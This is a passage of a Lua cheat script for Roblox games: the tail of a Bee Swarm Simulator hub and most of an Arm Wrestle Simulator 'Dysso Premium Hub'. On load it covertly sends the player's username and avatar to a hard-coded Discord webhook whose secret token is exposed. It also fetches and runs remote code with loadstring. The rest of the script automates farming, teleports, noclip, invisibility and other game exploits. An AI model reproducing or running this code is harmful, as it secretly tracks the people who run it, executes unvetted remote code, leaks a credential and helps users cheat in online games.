        local wcUpd = panel2:CreateButton("Wealth Clock: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").Toys["Wealth Clock"].Platform.Position + Vector3.new(0,5,0))) end)
        local mmsUpd = panel2:CreateButton("Mythic Meteor Shower: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").Toys["Mythic Meteor Shower"].Platform.Position + Vector3.new(0,5,0))) end)
        local utilities = {
            ["Red Field Booster"]=rfbUpd;
            ["Blue Field Booster"]=bfbUpd;
            ["Field Booster"]=wfbUpd;
            ["Coconut Dispenser"]=cocoDispUpd;
            ["Instant Converter"]=ic1;
            ["Instant Converter B"]=ic2;
            ["Instant Converter C"]=ic3;
            ["Wealth Clock"]=wcUpd;
            ["Mythic Meteor Shower"]=mmsUpd;
        }
        while wait(1) do
            if kocmoc.toggles.enablestatuspanel == true then
            for i,v in pairs(statusTable) do
                if v[1] and v[2] then
                    v[1]:UpdateText(
                    fetchVisualMonsterString(
                    v[2]
                    ))
                end
            end
            if workspace:FindFirstChild("Clock") then if workspace.Clock:FindFirstChild("SurfaceGui") then if workspace.Clock.SurfaceGui:FindFirstChild("TextLabel") then
                if workspace.Clock.SurfaceGui:FindFirstChild("TextLabel").Text == "! ! !" then
                    mob2:UpdateText("Mondo Chick: Ready")
                else
                    mob2:UpdateText("Mondo Chick: " .. string.gsub(
                    string.gsub(workspace.Clock.SurfaceGui:FindFirstChild("TextLabel").Text,"\n","")
                    ,"Mondo Chick:",""))
                end
            end 
            end end
            local cooldown = require(game.ReplicatedStorage.TimeString)(3600 - (require(game.ReplicatedStorage.OsTime)() - (require(game.ReplicatedStorage.StatTools).GetLastCooldownTime(v1, "WindShrine") or 0)))
            if cooldown == "" then windUpd:UpdateText("Wind Shrine: Ready") else windUpd:UpdateText("Wind Shrine: " .. cooldown) end
            for i,v in pairs(utilities) do
                local cooldown,isUsable = getToyCooldown(i)
                if cooldown ~= nil and isUsable ~= nil then
                    if isUsable then
                        v:UpdateText(i..": Ready")
                    else
                        v:UpdateText(i..": "..require(game.ReplicatedStorage.TimeString)(cooldown))
                    end
                end
            end
            end
        end
        end)
    end)
    
    if _G.autoload then if isfile("kocmoc/BSS_".._G.autoload..".json") then kocmoc = game:service'HttpService':JSONDecode(readfile("kocmoc/BSS_".._G.autoload..".json")) end end
    for _, part in next, workspace:FindFirstChild("FieldDecos"):GetDescendants() do if part:IsA("BasePart") then part.CanCollide = false part.Transparency = part.Transparency < 0.5 and 0.5 or part.Transparency task.wait() end end
    for _, part in next, workspace:FindFirstChild("Decorations"):GetDescendants() do if part:IsA("BasePart") and (part.Parent.Name == "Bush" or part.Parent.Name == "Blue Flower") then part.CanCollide = false part.Transparency = part.Transparency < 0.5 and 0.5 or part.Transparency task.wait() end end
    for i,v in next, workspace.Decorations.Misc:GetDescendants() do if v.Parent.Name == "Mushroom" then v.CanCollide = false v.Transparency = 0.5 end end    

end



 if game.PlaceId == 13127800756 then
    local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
    
    local url =
    "https://discord.com/api/webhooks/1139378568766423131/hckPeULqwRlUuaZjQzJidk-UrcNPMyWIdXq7fJE5tG7KUIOcXkhGnXn3f_cw88BPn925"
    local data = {
    ["embeds"] = {
        {
            ["title"] = ("Arm Wrestle Simulator"),
            ["description"] = tostring((game.Players.LocalPlayer.Name)),
            ["type"] = "rich",
            ["color"] = tonumber(7498202),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring((game.Players.LocalPlayer.Name))
            }
        }
    }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    
    local headers = {
    ["content-type"] = "application/json"
    }
    
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

getgenv().autoBiceps = false;
getgenv().autoGrips = false;
getgenv().autoFight = false;
getgenv().autoEgg = false;
getgenv().autoRebirth = false;
getgenv().autoSpin = false;
getgenv().autoClaim = false;
getgenv().autoCraft = false;
getgenv().autoWall = false;
getgenv().autoBar = false;
getgenv().autoKnuckles = false;
getgenv().autoClip = false;
getgenv().autoF = false;
getgenv().autoG = false;
getgenv().autoK = false;
getgenv().autoServer = false;
getgenv().autoArm = false;



local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

local Window = Library:CreateWindow({


    Title = 'Dysso Premium Hub',
    Center = true,
    AutoShow = true,
    TabPadding = 1,
    MenuFadeTime = 0.2
})

local Tabs = {
    
    Main = Window:AddTab('Main'),
    Farm = Window:AddTab('Farm'),
    ['UI Settings'] = Window:AddTab('UI Settings'),
}


local LeftGroupBox = Tabs.Main:AddLeftGroupbox('Misc')
local LeftGroupBox4 = Tabs.Main:AddLeftGroupbox('Auto Farm')
local LeftGroupBox2 = Tabs.Main:AddLeftGroupbox('Teleport')
local LeftGroupBox3 = Tabs.Main:AddLeftGroupbox('Player')


for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
v:Disable()
end

LeftGroupBox:AddToggle('Anti AFK', {
    Text = 'Anti AFK',
    Default = false, -- Default value (true / false)
    Callback = function(Value)
        print('Anti AFK:', Value)
    end
})

LeftGroupBox:AddToggle('Auto Craft', {
Text = 'Auto Craft',
 Default = false, -- Default value (true / false)
 Callback = function(bool)
    getgenv().autoCraft = bool
print('Auto Craft: ', bool);
if bool then
doCraft();
end
end})

LeftGroupBox:AddToggle('Auto Rebirth', {
    Text = 'Auto Rebirth',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoRebirth = bool
 print('Auto Rebirth: ', bool);
 if bool then
 doRebirth();
 end
end})

LeftGroupBox:AddToggle('Auto Spin', {
    Text = 'Auto Spin',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoSpin = bool
        print('Auto Spin: ', bool);
        if bool then
        doSpin();
        end
end})



LeftGroupBox:AddToggle('Claim Gifts', {
    Text = 'Claim Gifts',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoClaim = bool
 print('Auto Claim: ', bool);
 if bool then
 doClaim();
 wait(1)
 doClaim2();
 wait(1)
 doClaim3();
 wait(1)
 doClaim4();
 wait(1)
 doClaim5();
 wait(1)
 doClaim6();
 wait(1)
 doClaim7();
 wait(1)
 doClaim8();
 wait(1)
 doClaim9();
 wait(1)
 doClaim10();
 wait(1)
 doClaim11();
 wait(1)
 doClaim12();
 wait(1)
 end
end})

LeftGroupBox4:AddToggle('Biceps', {
    Text = 'Biceps',
     Default = false, -- Default value (true / false)
     Callback = function(bool)
        getgenv().autoB = bool
    print('Auto Biceps: ', bool);
    if bool then
    doB();
    end
    end})

    LeftGroupBox4:AddToggle('Hands', {
        Text = 'Hands',
         Default = false, -- Default value (true / false)
         Callback = function(bool)
            getgenv().autoG = bool
        print('Auto Grips: ', bool);
        if bool then
        doG();
        end
        end})

        LeftGroupBox4:AddToggle('Knuckles', {
            Text = 'Knuckles',
             Default = false, -- Default value (true / false)
             Callback = function(bool)
                getgenv().autoK = bool
            print('Auto Knuckles: ', bool);
            if bool then
            doK();
            end
            end})




local MyButton = LeftGroupBox2:AddButton({
    Text = 'Teleport 3.Map',
    Func = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(11609.6045, 9.28769207, -31.5290527, 0.438346624, 0, 0.898806036, 0, 1, 0, -0.898806036, 0, 0.438346624)
    end,
    DoubleClick = false,
    Tooltip = 'Teleport'
})

local MyButton = LeftGroupBox2:AddButton({
    Text = 'Teleport 4.Map',
    Func = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-10294.5049, 3.79114127, -905.802246, 0, 0, 1, 0, 1, -0, -1, 0, 0)
    end,
    DoubleClick = false,
    Tooltip = 'Teleport'
})

local MyButton = LeftGroupBox2:AddButton({
    Text = 'Teleport 5.Map',
    Func = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-10294.3984, -6.70059776, -1417.25708, 1, 0, 0, 0, 1, 0, 0, 0, 1)
    end,
    DoubleClick = false,
    Tooltip = 'Teleport'
})

local MyButton = LeftGroupBox2:AddButton({
    Text = 'Teleport Atlantis',
    Func = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9649.84277, 11.1690807, 137.245789, -0.793932915, 0, -0.608005404, 0, 1, 0, 0.608005404, 0, -0.793932915)
    end,
    DoubleClick = false,
    Tooltip = 'Teleport'
})

LeftGroupBox3:AddSlider('Player', {
    Text = 'Walkspeed',
    Default = 16,
    Min = 0,
    Max = 100,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
getgenv().WalkSpeedValue = (Value); --set your desired walkspeed here
local Player = game:service'Players'.LocalPlayer;
Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
end)
Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
    end
})


local MyButton = LeftGroupBox3:AddButton({
    Text = 'FPS BOOST',
    Func = function()
        for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
                v.Material = Enum.Material.SmoothPlastic
                if v:IsA("Texture") then
                    v:Destroy()
                end
            end
        end
    end,
    DoubleClick = false,
    Tooltip = 'FPS BOOST'
})

local MyButton = LeftGroupBox3:AddButton({
    Text = 'No Clip',
    Func = function()
        local Players, Player = game:GetService("Players"), game:GetService("Players").LocalPlayer -- im trying something new with my coding
getgenv().FuckYouSkid = true
getgenv().NoPlatformNoclip = false -- the patched platformnoclip unpatched thanks to the two lines below credits to Panda
getgenv().CanCollide = true -- basic everyday noclip

if setfflag then
    setfflag("HumanoidParallelRemoveNoPhysics", "False") -- thank you panda your hot UwU
    setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
end

game:GetService("RunService").Stepped:Connect(
    function()
        if getgenv().FuckYouSkid then
            for i, v in pairs(Player.Character:GetChildren()) do
                if v:IsA("BasePart") and getgenv().CanCollide then
                    v.CanCollide = false-- boring old CanCollide Right?
                elseif v:IsA("Humanoid") and getgenv().NoPlatformNoclip then
                    v:ChangeState(11) -- sexy
                end
            end
        end
    end
)
    end,
    DoubleClick = false,
    Tooltip = 'No Clip'
})


function doB()
    spawn(function()
     while getgenv().autoB == true do
        local button = game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Menus.AutoTrain.Content.Biceps

local events = {"MouseButton1Click", "MouseButton1Down", "Activated", "MouseButton1Up"}
for i,v in pairs(events) do
   for i,v in pairs(getconnections(button[v])) do
       v:Fire()
   end
end
task.wait()
     game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
     wait(3600)
     end
    end)
end

function doG()
    spawn(function()
     while getgenv().autoG == true do
        local button = game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Menus.AutoTrain.Content.Hands

local events = {"MouseButton1Click", "MouseButton1Down", "Activated", "MouseButton1Up"}
for i,v in pairs(events) do
   for i,v in pairs(getconnections(button[v])) do
       v:Fire()
   end
end
                         
     wait(3600)
     game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
     task.wait()
     end
    end)
end

function doK()
    spawn(function()
     while getgenv().autoK == true do
        local button = game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Menus.AutoTrain.Content.Knuckles

local events = {"MouseButton1Click", "MouseButton1Down", "Activated", "MouseButton1Up"}
for i,v in pairs(events) do
   for i,v in pairs(getconnections(button[v])) do
       v:Fire()
   end
end
      wait(3600)                                  
     end
    end)
end

local LeftGroupBox = Tabs.Farm:AddLeftGroupbox('Multi Farm');
LeftGroupBox:AddLabel('First select knuckles, then you can choose hands or biceps.', true)

LeftGroupBox:AddToggle('Knuckles', {
    Text = 'Knuckles',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoK = bool
 print('Auto Biceps: ', bool);
 if bool then
 doK();
 end
end})

local key = Enum.KeyCode.E
LeftGroupBox:AddLabel('Invisible Player'):AddKeyPicker('KeyPicker', {
    Default = 'E',
    SyncToggleState = false,
    Mode = 'Toggle', 
    Text = 'Auto lockpick safes', 
    NoUI = false, 

    Callback = function(Value)
        local invis_on = false
function onKeyPress(inputObject, chat)
   if chat then return end
   if inputObject.KeyCode == key then
       invis_on = not invis_on
       if invis_on then
           local savedpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
           task.wait()
           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -200, 0)
           wait(0.15)
           local Seat = Instance.new('Seat', game.Workspace)
           Seat.Anchored = false
           Seat.CanCollide = false
           Seat.Name = 'invischair'
           Seat.Transparency = 1
           Seat.Position = Vector3.new(0, -200, 0)
           local Weld = Instance.new("Weld", Seat)
           Weld.Part0 = Seat
           Weld.Part1 = game.Players.LocalPlayer.Character:FindFirstChild("Torso") or game.Players.LocalPlayer.Character.UpperTorso
           task.wait()
           Seat.CFrame = savedpos
           game.StarterGui:SetCore("SendNotification", {
               Title = "Invis On";
               Duration = 1;
               Text = "";
           })
       else
           workspace:FindFirstChild('invischair'):Remove()
           game.StarterGui:SetCore("SendNotification", {
               Title = "Invis Off";
               Duration = 1;
               Text = "";
           })
       end
   end
end

game:GetService("UserInputService").InputBegan:connect(onKeyPress)
end

})


local LeftGroupBox3 = Tabs.Farm:AddLeftGroupbox('2.Map')
LeftGroupBox3:AddToggle('Biceps', {
    Text = 'Biceps',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoBiceps = bool
 print('Auto Biceps: ', bool);
 if bool then
 doBiceps2();
 end
end})

LeftGroupBox3:AddToggle('Hands', {
    Text = 'Hands',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoGrips = bool
print('Auto Grips: ', bool);
if bool then
doGrips2();
end
end})


local LeftGroupBox4 = Tabs.Farm:AddLeftGroupbox('3.Map')
LeftGroupBox4:AddToggle('Biceps', {
    Text = 'Biceps',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoBiceps = bool
 print('Auto Biceps: ', bool);
 if bool then
 doBiceps3();
 end
end})

LeftGroupBox4:AddToggle('Hands', {
    Text = 'Hands',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoGrips = bool
print('Auto Grips: ', bool);
if bool then
doGrips3();
end
end})



local LeftGroupBox5 = Tabs.Farm:AddLeftGroupbox('4.Map')
LeftGroupBox5:AddToggle('Biceps', {
    Text = 'Biceps',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoBiceps = bool
 print('Auto Biceps: ', bool);
 if bool then
 doBiceps4();
 end
 end})

LeftGroupBox5:AddToggle('Hands', {
    Text = 'Hands',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoGrips = bool
print('Auto Grips: ', bool);
if bool then
doGrips4();
end
end})

LeftGroupBox5:AddToggle('Barbells', {
    Text = 'Barbells',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoBiceps = bool
    print('Auto Biceps: ', bool);
    if bool then
    doBiceps5();
    end
end})
local LeftGroupBox6 = Tabs.Farm:AddLeftGroupbox('5.Map')
LeftGroupBox6:AddToggle('Hands', {
    Text = 'Hands',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoGrips = bool
        print('Auto Grips: ', bool);
        if bool then
        doGrips5();
        end
end})


local LeftGroupBox7 = Tabs.Farm:AddLeftGroupbox('Atlantis')
LeftGroupBox7:AddToggle('Biceps', {
    Text = 'Biceps',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoBiceps = bool
        print('Auto Biceps: ', bool);
        if bool then
        doAtlb();
        end
 end})

LeftGroupBox7:AddToggle('Hands', {
    Text = 'Hands',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoGrips = bool
        print('Auto Grips: ', bool);
        if bool then
        doAtlg();
        end
end})

local RightGroupBox = Tabs.Farm:AddRightGroupbox('OP Fight');
RightGroupBox:AddLabel('Bypass clicks, better than auto click gamepass', true)
local MyButton = RightGroupBox:AddButton({
    Text = 'Bypass Left Click',
    Func = function()
        print('Bypassed')
    end,
    DoubleClick = false,
    Tooltip = 'OP'
})


local RightGroupBox2 = Tabs.Farm:AddRightGroupbox('2. Map')
RightGroupBox2:AddToggle('Ripper Doc', {
    Text = 'Ripper Doc',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
 print('Auto Fight: ', bool);
 if bool then
 doFight9();
 end
end})

RightGroupBox2:AddToggle('Rogue Ai', {
    Text = 'Rogue Ai',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
 print('Auto Fight: ', bool);
 if bool then
 doFight10();
 end
end})

local RightGroupBox3 = Tabs.Farm:AddRightGroupbox('3. Map')

RightGroupBox3:AddToggle('CocoNut', {
    Text = 'Coco Nut',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
 print('Auto Fight: ', bool);
 if bool then
 doFightcoco();
 end
end})

RightGroupBox3:AddToggle('Fat Pirate', {
    Text = 'Fat Pirate',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
 print('Auto Fight: ', bool);
 if bool then
 doFight12();
 end
end})

RightGroupBox3:AddToggle('Mermaid King', {
    Text = 'Mermaid King',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
 print('Auto Fight: ', bool);
 if bool then
 doFight13();
 end
end})
RightGroupBox3:AddToggle('Friendly Shark', {
    Text = 'Friendly Shark',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
 print('Auto Fight: ', bool);
 if bool then
 doFight14();
 end
end})

RightGroupBox3:AddToggle('Kraken Boss', {
    Text = 'Kraken Boss',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
 print('Auto Fight: ', bool);
 if bool then
 doFight15();
 end
end})

local RightGroupBox4 = Tabs.Farm:AddRightGroupbox('4. Map')
RightGroupBox4:AddToggle('Barbarian', {
    Text = 'Barbarian',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight16();
        end
end})

RightGroupBox4:AddToggle('Hazmat', {
    Text = 'Hazmat',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight17();
        end
end})

RightGroupBox4:AddToggle('Enforcer', {
    Text = 'Enforcer',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight18();
        end
end})

RightGroupBox4:AddToggle('Bulk', {
    Text = 'Bulk',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight19();
        end
end})

RightGroupBox4:AddToggle('Mutant King', {
    Text = 'Mutant King',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight20();
        end
end})

local RightGroupBox5 = Tabs.Farm:AddRightGroupbox('5. Map')
RightGroupBox5:AddToggle('Primal', {
    Text = 'Primal',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight21();
        end
end})

RightGroupBox5:AddToggle('Dino', {
    Text = 'Dino',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight22();
        end
end})

RightGroupBox5:AddToggle('Archeologist', {
    Text = 'Archeologist',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight23();
        end
end})

RightGroupBox5:AddToggle('Tribe Leader', {
    Text = 'Tribe Leader',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight24();
        end
end})
RightGroupBox5:AddToggle('Mammoth', {
    Text = 'Mammoth',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doFight25();
        end
end})

local RightGroupBox6 = Tabs.Farm:AddRightGroupbox('Atlantis')
RightGroupBox6:AddToggle('Scuba Diver', {
    Text = 'Scuba Diver',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doAtl11();
        end
end})


RightGroupBox6:AddToggle('Stone Guard', {
    Text = 'Stone Guard',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doAtl10();
        end
end})


RightGroupBox6:AddToggle('Buff Pirate', {
    Text = 'Buff Pirate',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doAtl9();
        end
end})


RightGroupBox6:AddToggle('Atlantean Warrior', {
    Text = 'Atlantean Warrior',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doAtl8();
        end
end})


RightGroupBox6:AddToggle('Poseidon', {
    Text = 'Poseidon',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoFight = bool
        print('Auto Fight: ', bool);
        if bool then
        doAtl7();
        end
end})

local RightGroupBox2 = Tabs.Main:AddRightGroupbox('World Eggs')
RightGroupBox2:AddToggle('Limited Egg', {
    Text = 'Limited Egg ',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
        doLimited();
        end
end})

RightGroupBox2:AddToggle('Burning Egg', {
Text = 'Burning Egg',
Default = false, 
Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
        doBurning();
        end
end})

RightGroupBox2:AddToggle('Poseidon Egg', {
Text = 'Poseidon Egg',
Default = false, 
Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
        doPoseidon();
        end
end})

RightGroupBox2:AddToggle('Nuclear Egg', {
    Text = 'Nuclear Egg',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
        doNuclear();
        end
end})

RightGroupBox2:AddToggle('Gem Dino Egg 5.Map', {
    Text = 'Gem Dino Egg',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
            doDino();
        end
end})

local RightGroupBox3 = Tabs.Main:AddRightGroupbox('Event Eggs')
RightGroupBox3:AddToggle('Frost Egg 3x', {
    Text = 'Frost Egg 3x',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
        doFrost();
        end
end})

RightGroupBox3:AddToggle('Crayon Egg 3x', {
    Text = 'Crayon Egg 3x',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
        doCrayon();
        end
end})

RightGroupBox3:AddToggle('Clawed Crusaders (Atlantis)', {
    Text = 'Clawed Crusaders (Atlantis)',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
        doAtl();
        end
end})


local RightGroupBox4 = Tabs.Main:AddRightGroupbox('8x Hatch Gamepass')
RightGroupBox4:AddToggle('Limited Egg', {
    Text = 'Limited Egg',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
            do8xlimited();
        end
end})

RightGroupBox4:AddToggle('Clawed Crusaders', {
    Text = 'Clawed Crusaders',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
            do8xclawed();
        end
end})

RightGroupBox4:AddToggle('Nuclear Egg', {
    Text = 'Nuclear Egg',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
            do8xnuclear();
        end
end})

RightGroupBox4:AddToggle('Gem Dino Egg', {
    Text = 'Gem Dino Egg',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
            do8xdino();
        end
end})

RightGroupBox4:AddToggle('Frost Egg', {
    Text = 'Frost Egg',
    Default = false, -- Default value (true / false)
    Callback = function(bool)
        getgenv().autoEgg = bool
        print('Auto Egg: ', bool);
        if bool then
            do8xfrost();
        end
end})

local RightGroupBox4 = Tabs.Main:AddRightGroupbox('');
RightGroupBox4:AddLabel('Auto delete feature is built in the script. It deletes most pets below the Omega tier', true)

local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')

-- I set NoUI so it does not show up in the keybinds menu
MenuGroup:AddButton('Exit Script', function() Library:Unload() end)
MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' })

Library.ToggleKeybind = Options.MenuKeybind -- Allows you to have a custom keybind for the menu

-- Addons:
-- SaveManager (Allows you to have a configuration system)
-- ThemeManager (Allows you to have a menu theme system)

-- Hand the library over to our managers
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

-- Ignore keys that are used by ThemeManager.
-- (we dont want configs to save themes, do we?)
SaveManager:IgnoreThemeSettings()

-- Adds our MenuKeybind to the ignore list
-- (do you want each config to have a different menu key? probably not.)
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })

-- use case for doing it this way:
-- a script hub could have themes in a global folder
-- and game configs in a separate folder per game
ThemeManager:SetFolder('DyssoHub')
SaveManager:SetFolder('DyssoHub/ArmWrestleSimulator')

-- Builds our config menu on the right side of our tab
SaveManager:BuildConfigSection(Tabs['UI Settings'])

-- Builds our theme menu (with plenty of built in themes) on the left side
-- NOTE: you can also call ThemeManager:ApplyToGroupbox to add it to a specific groupbox
ThemeManager:ApplyToTab(Tabs['UI Settings'])

-- You can use the SaveManager:LoadAutoloadConfig() to load a config
-- which has been marked to be one that auto loads!
SaveManager:LoadAutoloadConfig()






-- MISC FUNC

function doRebirth()
    spawn(function()
    while getgenv().autoRebirth == true do
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("RebirthService"):WaitForChild("RE"):WaitForChild("onRebirthRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doSpin()
    spawn(function()
    while getgenv().autoSpin == true do
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("SpinService"):WaitForChild("RE"):WaitForChild("onSpinRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doClaim()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "1"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim2()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "2"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim3()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "3"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim4()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "4"
    } 
